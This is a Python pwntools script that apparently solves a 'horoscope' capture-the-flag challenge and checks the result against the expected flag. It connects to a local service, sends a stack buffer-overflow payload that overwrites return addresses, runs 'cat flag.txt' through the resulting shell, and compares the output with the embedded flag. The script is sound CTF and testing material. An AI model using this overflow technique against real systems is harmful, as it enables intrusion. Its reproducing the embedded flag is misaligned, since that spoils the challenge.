#!/usr/bin/env python3
# -*- coding: utf-8 -*-
# Copyright 2020 Google LLC
#
# Licensed under the Apache License, Version 2.0 (the "License");
# you may not use this file except in compliance with the License.
# You may obtain a copy of the License at
#
#     https://www.apache.org/licenses/LICENSE-2.0
#
# Unless required by applicable law or agreed to in writing, software
# distributed under the License is distributed on an "AS IS" BASIS,
# WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
# See the License for the specific language governing permissions and
# limitations under the License.

import pwnlib
from pwn import *

FLAG = b"sdctf{S33ms_y0ur_h0rO5c0p3_W4s_g00d_1oD4y}"

p = pwnlib.tubes.remote.remote('127.0.0.1', 1337)

p.recvline()
p.recvline()
payload = b'1/1/1/1/2222'+b'a'*40+b'bbbb'+p64(0x000000000040096e) + p64(0x000000000400950)

p.sendline(payload)
p.sendline(b'cat flag.txt')
flag = p.recvuntil(b'}')
if flag == FLAG:
        print('success')
else:
        exit(1)
